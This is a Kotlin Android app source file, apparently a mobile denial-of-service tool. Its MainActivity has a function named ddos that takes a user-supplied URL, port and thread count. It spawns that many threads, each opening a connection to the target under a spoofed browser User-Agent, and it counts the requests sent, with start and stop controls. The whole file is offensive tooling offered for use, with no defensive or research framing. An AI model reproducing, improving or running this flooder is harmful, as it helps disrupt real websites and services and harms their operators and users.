package com.example.callisto

import android.os.Bundle
import android.view.Window
import androidx.appcompat.app.AppCompatActivity
import com.example.callisto.databinding.ActivityMainBinding
import java.net.URL
import java.util.concurrent.atomic.AtomicInteger
import android.view.WindowManager
import android.widget.ProgressBar
import android.widget.TextView

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private val headers = HashMap<String, String>().apply {
        put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/7.3")
    }
    private val threads = mutableListOf<Thread>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )

       // enableEdgeToEdge()
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        val progressBar=binding.progressBar
        progressBar.visibility=ProgressBar.INVISIBLE
        binding.C.visibility=TextView.INVISIBLE
        binding.start.setOnClickListener {
            progressBar.visibility=ProgressBar.VISIBLE
            binding.C.visibility=TextView.VISIBLE
            val url = binding.url.text.toString() + ":" + binding.port.text.toString()
           val threadCount = binding.tcount.text.toString().toInt()
            var requestsSent = ddos(url, threadCount)
            binding.count.text="Request sent=$requestsSent"
        }

        binding.stop.setOnClickListener {
            stopThreads()
            progressBar.visibility=ProgressBar.INVISIBLE
            binding.C.visibility=TextView.INVISIBLE
        }
    }

    private fun ddos(url: String, threadsSize: Int): Int {
        val requestCount = AtomicInteger(0)

        val newThreads: List<Thread> = (1..threadsSize).map {
            Thread {
                try {
                    val connection = URL(url).openConnection().apply {
                        setRequestProperty("User-Agent", headers["User-Agent"])
                    }
                    connection.connect()
                    requestCount.incrementAndGet()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }

        threads.addAll(newThreads)

        newThreads.forEach { it.start() }
        newThreads.forEach { it.join() }

        return requestCount.get()
    }

    private fun stopThreads() {
        threads.forEach { thread ->
            try {
                if (thread.isAlive) {
                    thread.interrupt()
                }
            } catch (e: InterruptedException) {
                e.printStackTrace()
            }
        }
        threads.clear()
    }
}
